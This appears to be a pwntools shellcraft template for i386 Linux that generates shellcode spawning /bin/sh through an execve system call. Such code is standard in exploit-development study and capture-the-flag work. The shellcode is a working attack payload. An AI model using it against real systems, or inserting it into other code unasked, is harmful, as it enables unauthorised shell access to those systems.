<% from pwnlib.shellcraft import i386 %>
<%docstring>Execute /bin/sh</%docstring>

    /*  Clear eax, ecx, edx */
    xor ecx, ecx
    imul ecx

    /*  Push '/bin//sh' */
${i386.pushstr('/bin//sh')}

    /*  Call execve("/bin//sh", 0, 0) */
    mov al, SYS_execve
    mov ebx, esp
    int 0x80

